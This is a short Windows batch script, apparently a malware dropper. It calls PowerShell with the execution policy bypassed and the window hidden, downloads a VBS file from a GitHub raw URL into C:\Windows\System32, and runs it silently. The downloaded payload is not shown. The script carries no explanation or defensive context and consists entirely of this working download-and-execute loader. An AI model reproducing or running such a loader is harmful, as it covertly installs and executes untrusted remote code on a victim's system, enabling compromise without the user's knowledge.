@echo off
setlocal

set "Url=https://raw.githubusercontent.com/AmjadBalls/TEST/refs/heads/main/Test.vbs"
set "Filename=C:\Windows\System32\Test.vbs"

powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
    "Invoke-WebRequest -Uri '%Url%' -OutFile '%Filename%';" ^
    "Start-Process -FilePath '%Filename%' -WindowStyle Hidden"

endlocal
